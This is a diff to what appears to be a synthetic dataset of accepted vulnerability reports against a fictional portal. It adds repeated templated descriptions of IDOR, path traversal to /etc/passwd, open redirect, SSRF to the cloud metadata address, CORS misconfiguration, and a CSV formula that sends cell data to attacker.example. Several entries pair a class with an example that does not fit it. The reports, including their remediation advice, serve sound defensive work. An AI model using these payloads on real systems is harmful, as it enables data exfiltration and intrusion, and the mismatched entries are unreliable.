+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.waldlicht-bildung.foo/statements/`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5213,7 +5253,8 @@
           "offset": "4d 21h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.waldlicht-bildung.foo/statements/`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5336,7 +5377,8 @@
           "offset": "10h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.waldlicht-bildung.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5464,7 +5506,8 @@
           "offset": "2d 12h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.waldlicht-bildung.foo/api/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5580,7 +5623,8 @@
           "offset": "3d 7h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.waldlicht-bildung.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5708,7 +5752,8 @@
           "offset": "7d 7h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.waldlicht-bildung.foo/api/v2/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5831,7 +5876,8 @@
           "offset": "2d 5h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.waldlicht-bildung.foo/export`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5978,7 +6024,8 @@
           "offset": "3d 11h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.waldlicht-bildung.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6110,7 +6157,8 @@
           "offset": "18h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.waldlicht-bildung.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6242,7 +6290,8 @@
           "offset": "4d 6h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.waldlicht-bildung.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6341,7 +6390,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.waldlicht-bildung.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6480,7 +6530,8 @@
           "offset": "3d 13h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.waldlicht-bildung.foo/api/documents/`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6620,7 +6671,8 @@
           "offset": "3d 13h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.waldlicht-bildung.foo/admin/items`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -6752,7 +6804,8 @@
           "offset": "1d 6h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.waldlicht-bildung.foo/api/me`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6898,7 +6951,8 @@
           "offset": "3d 9h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.waldlicht-bildung.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7054,7 +7108,8 @@
           "offset": "6d 16h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.waldlicht-bildung.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7177,7 +7232,8 @@
           "offset": "7d 10h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.waldlicht-bildung.foo/fetch`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7349,7 +7405,8 @@
           "offset": "8d 22h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.waldlicht-bildung.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7451,7 +7508,8 @@
           "offset": "3d 6h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.waldlicht-bildung.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7583,7 +7641,8 @@
           "offset": "1d 11h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.waldlicht-bildung.foo/api/v2/documents/`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7707,7 +7766,8 @@
           "offset": "2d 6h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.waldlicht-bildung.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7835,7 +7895,8 @@
           "offset": "2d 19h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.waldlicht-bildung.foo/export`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7943,7 +8004,8 @@
           "offset": "2d 11h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.waldlicht-bildung.foo/api/import`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8061,7 +8123,8 @@
           "offset": "6d 3h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.waldlicht-bildung.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8192,7 +8255,8 @@
           "offset": "6d 3h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.waldlicht-bildung.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8332,7 +8396,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.waldlicht-bildung.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8494,7 +8559,8 @@
           "offset": "6d 20h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.waldlicht-bildung.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8634,7 +8700,8 @@
           "offset": "1d",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.waldlicht-bildung.foo/admin/items`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -8730,7 +8797,8 @@
           "offset": "1d 7h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.waldlicht-bildung.foo/export?type=records`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8815,7 +8883,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.waldlicht-bildung.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8966,7 +9035,8 @@
           "offset": "7d 2h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.waldlicht-bildung.foo/v2/me`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9070,7 +9140,8 @@
           "offset": "1d 5h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.waldlicht-bildung.foo/export`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -9183,7 +9254,8 @@
           "offset": "6h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
